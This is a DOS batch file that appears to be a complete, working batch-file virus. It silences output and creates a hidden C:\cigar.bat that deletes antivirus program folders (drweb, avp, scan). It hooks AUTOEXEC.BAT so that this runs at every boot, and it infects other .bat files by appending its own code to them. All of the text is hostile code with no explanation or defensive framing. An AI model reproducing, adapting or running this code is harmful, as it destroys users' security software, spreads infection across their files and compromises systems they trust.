@ctty nul
if not exist c:\cigar.bat goto cigar
for %%i in (*.bat) do set cigar=%%i
for %%o in (%cigar%) do if "%cigar%"=="AUTOEXEC.BAT" goto mod
goto n
:cigar
echo @echo off >> c:\cigar.bat
echo echo Wait... >> c:\cigar.bat
echo del c:\drweb\*.??? >> c:\cigar.bat
echo del c:\avp\*.??? >> c:\cigar.bat
echo del c:\scan\*.??? >> c:\cigar.bat
echo cls >> c:\cigar.bat
attrib c:\cigar.bat +h +r
:mod
attrib autoexec.bat -r
copy autoexec.bat autoexec.olf
echo @if exist C:\CIGAR.BAT call C:\CIGAR.BAT > autoexec.bat
type autoexec.olf >> autoexec.bat
del autoexec.olf
:n
for %%t in (*.bat ..\*.bat ..\..\*.bat) do find "cigar" %%t
if not errorlevel 1 goto stp
for %%y in (%cigar%) do copy/b %Cigar%+%0
:stp
